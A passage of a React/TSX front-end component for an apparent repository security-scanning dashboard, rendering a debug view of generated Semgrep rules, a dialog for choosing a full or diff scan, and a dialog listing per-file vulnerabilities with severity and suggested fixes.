                                <Button variant="ghost" size="sm" onClick={() => copyToClipboard(JSON.stringify(llmR, null, 2), 'llm')}>
                                  {copiedSection === 'llm' ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
                                  <span className="ml-1.5 text-xs">{copiedSection === 'llm' ? 'Copied!' : 'Copy'}</span>
                                </Button>
                              </CardHeader>
                              <CardContent>
                                <ScrollArea className="h-64">
                                  <pre className="text-xs font-mono bg-muted/60 rounded p-3 whitespace-pre-wrap border border-border/40">{JSON.stringify(llmR, null, 2)}</pre>
                                </ScrollArea>
                              </CardContent>
                            </Card>
                          </>
                        )}
                      </div>
                    )}

                    {/* ───── SEMGREP RULES ───── */}
                    {debugInnerTab === 'rules' && (
                      <Card className="border-border/60">
                        <CardHeader className="pb-2 pt-4 flex flex-row items-center justify-between">
                          <div>
                            <CardTitle className="text-sm flex items-center gap-2"><Zap className="w-3.5 h-3.5 text-yellow-400" /> Generated Semgrep Rules (.fixora-rules.yml)</CardTitle>
                            <CardDescription className="text-xs mt-1">These were pushed to the repo alongside Semgrep's built-in --config auto rules</CardDescription>
                          </div>
                          <Button variant="ghost" size="sm" onClick={() => copyToClipboard(yaml, 'rules')} disabled={!yaml}>
                            {copiedSection === 'rules' ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
                            <span className="ml-1.5 text-xs">{copiedSection === 'rules' ? 'Copied!' : 'Copy'}</span>
                          </Button>
                        </CardHeader>
                        <CardContent>
                          {!yaml ? (
                            <p className="text-sm text-muted-foreground italic">No custom rules were generated — either no vulnerable wrappers found or scan hasn't run yet.</p>
                          ) : (
                            <ScrollArea className="h-[600px]">
                              <pre className="text-xs font-mono bg-muted/60 rounded p-4 whitespace-pre-wrap border border-border/40 leading-relaxed">{yaml}</pre>
                            </ScrollArea>
                          )}
                        </CardContent>
                      </Card>
                    )}

                  </div>
                );
              })()}
            </div>
          </TabsContent>
        </Tabs>
      </div>

      {/* Scan Options Dialog */}
      <Dialog open={showScanDialog} onOpenChange={setShowScanDialog}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Start Security Scan</DialogTitle>
            <DialogDescription>
              Choose how you want to scan this repository
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-4 py-4">
            <div
              className={`p-4 rounded-lg border-2 cursor-pointer transition-colors ${scanMode === 'full' ? 'border-primary bg-primary/5' : 'border-border hover:border-muted-foreground'
                }`}
              onClick={() => setScanMode('full')}
            >
              <div className="flex items-center gap-3">
                <div className={`w-4 h-4 rounded-full border-2 ${scanMode === 'full' ? 'border-primary bg-primary' : 'border-muted-foreground'
                  }`}>
                  {scanMode === 'full' && <div className="w-2 h-2 bg-white rounded-full m-auto mt-0.5" />}
                </div>
                <div>
                  <div className="font-medium">Full Scan</div>
                  <div className="text-sm text-muted-foreground">
                    Scan the entire repository for vulnerabilities
                  </div>
                </div>
              </div>
            </div>

            <div
              className={`p-4 rounded-lg border-2 cursor-pointer transition-colors ${scanMode === 'diff' ? 'border-primary bg-primary/5' : 'border-border hover:border-muted-foreground'
                }`}
              onClick={() => setScanMode('diff')}
            >
              <div className="flex items-center gap-3">
                <div className={`w-4 h-4 rounded-full border-2 ${scanMode === 'diff' ? 'border-primary bg-primary' : 'border-muted-foreground'
                  }`}>
                  {scanMode === 'diff' && <div className="w-2 h-2 bg-white rounded-full m-auto mt-0.5" />}
                </div>
                <div>
                  <div className="font-medium">Diff Scan (Latest Changes)</div>
                  <div className="text-sm text-muted-foreground">
                    Only scan files changed since last scan
                  </div>
                </div>
              </div>
            </div>

            {scanMode === 'diff' && commits.length > 0 && (
              <div className="pl-7">
                <label className="text-sm font-medium mb-2 block">
                  Compare from commit (optional)
                </label>
                <Select value={selectedCommit} onValueChange={setSelectedCommit}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select base commit" />
                  </SelectTrigger>
                  <SelectContent>
                    {commits.slice(0, 10).map((commit) => (
                      <SelectItem key={commit.sha} value={commit.sha}>
                        <div className="flex items-center gap-2">
                          <GitCommit className="w-3 h-3" />
                          <span className="font-mono text-xs">{commit.sha.slice(0, 7)}</span>
                          <span className="truncate max-w-[200px]">{commit.message.split('\n')[0]}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            )}
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={() => setShowScanDialog(false)}>
              Cancel
            </Button>
            <Button onClick={() => executeScan(scanMode)}>
              <Scan className="w-4 h-4 mr-2" />
              Start {scanMode === 'full' ? 'Full' : 'Diff'} Scan
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* File Vulnerabilities Dialog */}
      <Dialog open={!!selectedFileVulns} onOpenChange={(open) => !open && setSelectedFileVulns(null)}>
        <DialogContent className="max-w-3xl max-h-[80vh] overflow-hidden flex flex-col">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <FileCode className="w-5 h-5" />
              Vulnerabilities in {selectedFilePath.split('/').pop()}
            </DialogTitle>
            <DialogDescription className="font-mono text-xs">
              {selectedFilePath}
            </DialogDescription>
          </DialogHeader>
          <ScrollArea className="flex-1 -mx-6 px-6">
            <div className="space-y-4">
              {selectedFileVulns?.map((vuln, index) => (
                <Card key={vuln.id || index} className="border-red-500/20">
                  <CardHeader className="pb-2">
                    <div className="flex items-start justify-between">
                      <div>
                        <CardTitle className="text-base">{vuln.title}</CardTitle>
                        <CardDescription className="text-xs">
                          Line {vuln.line_number} • {vuln.type || 'Unknown Type'}
                        </CardDescription>
                      </div>
                      <Badge variant={
                        vuln.severity === 'critical' ? 'destructive' :
                          vuln.severity === 'high' ? 'destructive' :
                            vuln.severity === 'medium' ? 'warning' : 'secondary'
                      }>
                        {vuln.severity}
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent className="pt-0 space-y-3">
                    <p className="text-sm text-muted-foreground">{vuln.description}</p>
                    {normalizeCodeSnippet(vuln.code_snippet) && (
                      <div className="bg-muted rounded-md p-3 overflow-x-auto">
                        <pre className="text-xs font-mono whitespace-pre">
                          {normalizeCodeSnippet(vuln.code_snippet)}
                        </pre>
                      </div>
                    )}
                    {vuln.fix_suggestion && (
                      <div className="bg-green-500/10 border border-green-500/20 rounded-md p-3">
                        <p className="text-xs font-semibold text-green-500 mb-1">Suggested Fix:</p>
                        <p className="text-sm">{vuln.fix_suggestion}</p>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
          <DialogFooter className="mt-4">
            <Button variant="outline" onClick={() => setSelectedFileVulns(null)}>
              Close
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </DashboardLayout>
  );
};

export default RepositoryDetail;
